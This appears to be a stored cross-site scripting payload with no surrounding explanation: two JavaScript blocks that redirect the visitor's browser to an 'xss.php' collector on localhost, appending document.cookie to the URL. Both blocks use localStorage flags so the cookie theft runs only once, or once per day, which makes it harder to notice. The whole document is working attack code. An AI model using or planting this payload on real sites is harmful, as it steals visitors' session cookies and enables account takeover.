<script language= "JavaScript">
var url=window.location.href;
      var a=localStorage.getItem("a");
      if(a=="t")
      {
        alert(a);
        document.location="http://localhost/os/xss.php?cookie=" + document.cookie;
        //document.location=url;
        localStorage.setItem("a", "s");

      }

</script>



<script language= "JavaScript">
var today = new Date();
var date = today.getDate();
var b=localStorage.getItem("b");
var d=localStorage.getItem("d");
if(b==null || date>d)
{
document.location="http://localhost/os/xss.php?cookie=" + document.cookie;
localStorage.setItem("b", "b");
localStorage.setItem("d", date);
}
</script>
